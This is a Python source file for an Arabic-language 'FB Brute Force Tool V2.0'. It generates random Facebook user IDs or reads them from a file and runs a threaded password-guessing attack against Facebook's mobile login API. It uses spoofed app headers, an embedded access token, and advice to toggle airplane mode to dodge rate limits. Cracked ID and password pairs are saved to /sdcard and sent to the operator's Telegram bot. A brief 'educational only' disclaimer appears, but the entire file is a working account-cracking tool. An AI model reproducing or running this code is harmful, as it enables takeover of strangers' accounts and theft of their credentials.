from concurrent.futures import ThreadPoolExecutor
import requests
import sys
from os import system as cmd
from random import randint as rr, choice as rc
from string import digits
import time
import webbrowser
from rich import print
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

# إزالة فتح المتصفح التلقائي - سيتم السؤال أولاً
# webbrowser.open('https://t.me/bsqsm455')

class FBBruteForce:
    def __init__(self):
        self.token = ""
        self.bot_id = ""
        self.loop = 0
        self.ok = 0
        self.cp = 0
        self.session = requests.Session()
        
    def banner(self):
        """عرض البانر المحسن"""
        banner_art = '''
⠀⠀⠀⠀⠀⠀⣀⣤⣶⣶⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀
⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀
⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠛⠿⠿⠿⠿⠿⠿⠛⠉⠀⠀⠀⠀⠀

 ╔════════════════════════════════╗
 ║   FB BRUTE FORCE TOOL V2.0    ║
 ║        Enhanced Version        ║
 ╚════════════════════════════════╝
        '''
        print(Panel(banner_art, style="bold cyan", border_style="green"))
        
    def clear(self):
        """مسح الشاشة"""
        cmd("clear" if sys.platform != "win32" else "cls")
        
    def setup_bot(self):
        """إعداد التوكن والبوت"""
        print(Panel("[bold yellow]⚙️  إعداد البوت", border_style="yellow"))
        
        self.token = input('[bold green]🔑 أدخل توكن البوت: [/bold green]').strip()
        self.bot_id = input('[bold green]🆔 أدخل معرف البوت: [/bold green]').strip()
        
        # اختبار الاتصال بالبوت
        try:
            test_url = f'https://api.telegram.org/bot{self.token}/getMe'
            response = requests.get(test_url, timeout=10)
            if response.status_code == 200:
                bot_info = response.json()
                if bot_info.get('ok'):
                    print(Panel(f"[bold green]✅ تم الاتصال بالبوت بنجاح!\n📱 اسم البوت: {bot_info['result']['first_name']}", 
                               border_style="green"))
                    # إرسال رسالة بداية
                    self.send_telegram(f"🚀 تم تشغيل الأداة بنجاح!\n⏰ الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}\n✨ جاهز للصيد!")
                    return True
            print(Panel("[bold red]❌ فشل الاتصال بالبوت. تحقق من التوكن!", border_style="red"))
            return False
        except Exception as e:
            print(Panel(f"[bold red]❌ خطأ في الاتصال: {str(e)}", border_style="red"))
            return False
            
    def main_menu(self):
        """القائمة الرئيسية"""
        self.clear()
        self.banner()
        
        print(Panel("""
[cyan bold]1.[/cyan bold] [green]صيد حسابات 2009-2014[/green]
[cyan bold]2.[/cyan bold] [yellow]صيد من ملف معرفات[/yellow]
[cyan bold]3.[/cyan bold] [blue]الإعدادات[/blue]
[cyan bold]0.[/cyan bold] [red]خروج[/red]
        """, title="[bold]القائمة الرئيسية[/bold]", border_style="cyan"))
        
        choice = input('\n[bold yellow]اختر خيار: [/bold yellow]').strip()
        
        if choice == "1":
            self.start_old_accounts()
        elif choice == "2":
            self.start_from_file()
        elif choice == "3":
            self.settings_menu()
        elif choice == "0":
            print("[bold red]وداعاً! 👋[/bold red]")
            sys.exit(0)
        else:
            print("[bold red]❌ اختيار غير صحيح![/bold red]")
            time.sleep(1)
            self.main_menu()
            
    def start_old_accounts(self):
        """صيد الحسابات القديمة"""
        self.clear()
        self.banner()
        
        print(Panel("[bold cyan]مثال: 10000, 50000, 100000", border_style="cyan"))
        
        try:
            limit = int(input('[bold yellow]🎯 عدد المحاولات: [/bold yellow]'))
        except ValueError:
            print("[bold red]❌ يجب إدخال رقم صحيح![/bold red]")
            time.sleep(2)
            return self.main_menu()
            
        # توليد المعرفات
        user_ids = []
        print("\n[bold green]⏳ جاري توليد المعرفات...[/bold green]")
        for _ in range(limit):
            random_num = ''.join(rc(digits) for _ in range(10))
            user_ids.append("10000" + random_num)
            
        # بدء الصيد
        self.start_cracking(user_ids, ['123456', '123456789'])
        
    def start_from_file(self):
        """صيد من ملف"""
        self.clear()
        self.banner()
        
        file_path = input('[bold yellow]📁 أدخل مسار الملف: [/bold yellow]').strip()
        
        try:
            with open(file_path, 'r') as f:
                user_ids = [line.strip() for line in f if line.strip()]
            
            if not user_ids:
                print("[bold red]❌ الملف فارغ![/bold red]")
                time.sleep(2)
                return self.main_menu()
                
            passwords = input('[bold yellow]🔑 أدخل كلمات المرور (مفصولة بفاصلة): [/bold yellow]').strip().split(',')
            passwords = [p.strip() for p in passwords if p.strip()]
            
            self.start_cracking(user_ids, passwords)
            
        except FileNotFoundError:
            print("[bold red]❌ الملف غير موجود![/bold red]")
            time.sleep(2)
            return self.main_menu()
            
    def start_cracking(self, user_ids, passwords):
        """بدء عملية الاختراق"""
        self.clear()
        self.banner()
        
        total = len(user_ids)
        
        print(Panel(f"""
[bold green]✅ إجمالي المعرفات:[/bold green] [yellow]{total}[/yellow]
[bold green]🔑 كلمات المرور:[/bold green] [yellow]{', '.join(passwords)}[/yellow]
[bold blue]⚡ عدد الخيوط:[/bold blue] [yellow]30[/yellow]
[bold yellow]⚠️ نصيحة: قم بتشغيل/إيقاف وضع الطيران كل 5 دقائق[/bold yellow]
        """, border_style="green"))
        
        time.sleep(2)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        ) as progress:
            
            task = progress.add_task("[cyan]جاري الصيد...", total=total)
            
            with ThreadPoolExecutor(max_workers=30) as executor:
                for uid in user_ids:
                    executor.submit(self.crack_account, uid, passwords)
                    progress.update(task, advance=1)
                    
        # إظهار النتائج
        self.show_results()
        
    def crack_account(self, uid, passwords):
        """محاولة اختراق حساب واحد"""
        try:
            for password in passwords:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': self.get_user_agent(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                
                url = (f"https://b-api.facebook.com/method/auth.login?"
                       f"format=json&email={uid}&password={password}"
                       f"&credentials_type=device_based_login_password"
                       f"&generate_session_cookies=1&error_detail_type=button_with_disabled"
                       f"&source=device_based_login&meta_inf_fbmeta=¤tly_logged_in_userid=0"
                       f"&method=GET&locale=en_US&client_country_code=US"
                       f"&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
                       f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                       f"&fb_api_req_friendly_name=authenticate&cpl=true")
                
                response = requests.get(url, headers=headers, timeout=20)
                result = response.json()
                
                if "session_key" in result or "Please Confirm Email" in str(result):
                    self.ok += 1
                    self.save_result(uid, password, "OK")
                    self.send_telegram_success(uid, password)
                    print(f"\n[bold green]✅ نجاح: {uid} | {password}[/bold green]")
                    break
                elif "www.facebook.com" in str(result):
                    self.cp += 1
                    self.save_result(uid, password, "CP")
                    
                self.loop += 1
                
        except Exception as e:
            pass
            
    def save_result(self, uid, password, status):
        """حفظ النتائج"""
        filename = f"/sdcard/FB-{status}.txt"
        try:
            with open(filename, 'a') as f:
                f.write(f"{uid}|{password}\n")
        except:
            pass
            
    def send_telegram(self, message):
        """إرسال رسالة عبر تيليجرام"""
        try:
            url = f'https://api.telegram.org/bot{self.token}/sendMessage'
            data = {'chat_id': self.bot_id, 'text': message, 'parse_mode': 'HTML'}
            requests.post(url, data=data, timeout=10)
        except:
            pass
            
    def send_telegram_success(self, uid, password):
        """إرسال رسالة نجاح"""
        message = f"""
🎉 <b>تم العثور على حساب!</b>

👤 <b>المعرف:</b> <code>{uid}</code>
🔑 <b>كلمة المرور:</b> <code>{password}</code>

🔗 <b>الرابط:</b>
https://www.facebook.com/{uid}

⏰ <b>الوقت:</b> {time.strftime('%H:%M:%S')}

✨ <i>لا تنسى تصوير الصيد!</i>
        """
        self.send_telegram(message)
        
    def show_results(self):
        """عرض النتائج النهائية"""
        self.clear()
        print(Panel(f"""
[bold green]═══════════ النتائج النهائية ═══════════[/bold green]

[bold cyan]✅ الناجحة (OK):[/bold cyan] [green]{self.ok}[/green]
[bold yellow]⚠️ نقطة تفتيش (CP):[/bold yellow] [yellow]{self.cp}[/yellow]
[bold blue]🔄 إجمالي المحاولات:[/bold blue] [blue]{self.loop}[/blue]

[bold green]📁 تم حفظ النتائج في:[/bold green]
[cyan]• /sdcard/FB-OK.txt[/cyan]
[cyan]• /sdcard/FB-CP.txt[/cyan]
        """, border_style="green", title="[bold]🎯 انتهى الصيد[/bold]"))
        
        # إرسال النتائج للبوت
        summary = f"""
📊 <b>ملخص الصيد</b>

✅ الناجحة: {self.ok}
⚠️ نقطة التفتيش: {self.cp}
🔄 المحاولات: {self.loop}

⏰ الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}
        """
        self.send_telegram(summary)
        
        input("\n[bold yellow]اضغط Enter للعودة للقائمة...[/bold yellow]")
        self.main_menu()
        
    def settings_menu(self):
        """قائمة الإعدادات"""
        self.clear()
        self.banner()
        
        print(Panel("""
[cyan bold]1.[/cyan bold] [green]فتح قناة التيليجرام[/green]
[cyan bold]2.[/cyan bold] [yellow]عرض معلومات الأداة[/yellow]
[cyan bold]0.[/cyan bold] [red]رجوع[/red]
        """, title="[bold]الإعدادات[/bold]", border_style="cyan"))
        
        choice = input('\n[bold yellow]اختر خيار: [/bold yellow]').strip()
        
        if choice == "1":
            webbrowser.open('https://t.me/bsqsm455')
            print("[bold green]✅ تم فتح قناة التيليجرام![/bold green]")
            time.sleep(2)
            self.settings_menu()
        elif choice == "2":
            self.show_info()
        elif choice == "0":
            self.main_menu()
        else:
            print("[bold red]❌ اختيار غير صحيح![/bold red]")
            time.sleep(1)
            self.settings_menu()
            
    def show_info(self):
        """عرض معلومات الأداة"""
        print(Panel("""
[bold cyan]🛠️ FB Brute Force Tool V2.0[/bold cyan]

[bold green]المطور:[/bold green] زعيم
[bold green]التيليجرام:[/bold green] @zzmmkj
[bold green]القناة:[/bold green] @bsqsm455

[bold yellow]⚠️ تحذير:[/bold yellow]
[red]هذه الأداة للأغراض التعليمية فقط
استخدامها على حسابات الآخرين بدون إذن غير قانوني[/red]

[bold blue]المميزات:[/bold blue]
• واجهة محسنة وأنيقة
• إرسال النتائج للتيليجرام
• دعم الملفات
• معالجة أخطاء محسنة
        """, border_style="cyan", title="[bold]معلومات الأداة[/bold]"))
        
        input("\n[bold yellow]اضغط Enter للرجوع...[/bold yellow]")
        self.settings_menu()
        
    def get_user_agent(self):
        """الحصول على user agent عشوائي"""
        agents = [
            "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
            "Dalvik/2.1.0 (Linux; U; Android 9.0; SM-G960F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/200.0.0.16.84;FBPN/com.facebook.orca;FBLC/en_US;FBBV/140726798;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G960F;FBSV/9.0;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]"
        ]
        return rc(agents)
        
    def run(self):
        """تشغيل الأداة"""
        self.clear()
        self.banner()
        
        if self.setup_bot():
            time.sleep(1)
            self.main_menu()
        else:
            retry = input("\n[bold yellow]هل تريد إعادة المحاولة؟ (y/n): [/bold yellow]").strip().lower()
            if retry == 'y':
                self.run()
            else:
                sys.exit(0)

# تشغيل الأداة
if __name__ == "__main__":
    try:
        tool = FBBruteForce()
        tool.run()
    except KeyboardInterrupt:
        print("\n[bold red]تم إيقاف الأداة بواسطة المستخدم 👋[/bold red]")
        sys.exit(0)
    except Exception as e:
        print(f"[bold red]❌ خطأ غير متوقع: {str(e)}[/bold red]")
        sys.exit(1)